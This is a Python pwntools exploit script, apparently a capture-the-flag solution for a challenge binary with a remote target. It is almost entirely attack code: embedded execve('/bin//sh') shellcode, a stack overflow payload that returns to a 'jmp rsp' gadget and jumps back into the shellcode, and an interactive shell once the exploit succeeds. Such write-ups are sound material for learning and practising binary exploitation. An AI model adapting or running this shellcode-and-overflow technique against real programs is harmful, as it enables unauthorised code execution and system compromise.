#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')
context.log_level = 'INFO'

if args.REMOTE:
	p = remote('challs.xmas.htsp.ro', 2000)
else:
	p = process(binary.path)

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b''
shellcode += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf'
shellcode += b'\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54'
shellcode += b'\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

jmp_rsp = list(binary.search(asm('jmp rsp')))[0]

payload  = b''
payload += shellcode
payload += (0x38 - 0xa - len(payload)) * b'A'
payload += p16(0x10000 - 0x1b01)
payload += (0x38 - len(payload)) * b'A'
payload += p64(jmp_rsp)
payload += asm('jmp $-0x40')

p.sendlineafter('for XMAS\n', payload)
p.interactive()
